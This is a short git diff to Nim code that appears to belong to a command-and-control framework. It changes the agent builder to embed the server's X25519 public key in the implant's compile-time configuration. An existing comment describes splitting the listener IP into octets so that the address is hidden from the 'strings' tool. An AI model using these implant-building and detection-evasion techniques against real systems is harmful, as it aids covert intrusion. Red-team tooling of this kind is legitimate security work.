@@ -1,4 +1,4 @@
-import terminal, strformat, strutils, tables, times, system, osproc, streams
+import terminal, strformat, strutils, tables, times, system, osproc, streams, base64
 
 import ../utils
 import ../task/dispatcher
@@ -140,6 +140,9 @@ proc agentBuild*(cq: Conquest, listener, sleep, payload: string) =
     # Parse IP Address and store as compile-time integer to hide hardcoded-strings in binary from `strings` command
     let (first, second, third, fourth) = parseOctets(listener.address)
 
+    # Covert the servers's public X25519 key to as base64 string 
+    let publicKey = encode(cq.keyPair.publicKey)
+
     # The following shows the format of the agent configuration file that defines compile-time variables 
     let config = fmt"""
     # Agent configuration 
@@ -150,6 +153,7 @@ proc agentBuild*(cq: Conquest, listener, sleep, payload: string) =
     -d:Octet4="{fourth}"
     -d:ListenerPort={listener.port}
     -d:SleepDelay={sleep}
+    -d:ServerPublicKey="{publicKey}"
     """.replace("    ", "")
     writeFile(agentConfigFile, config)
 
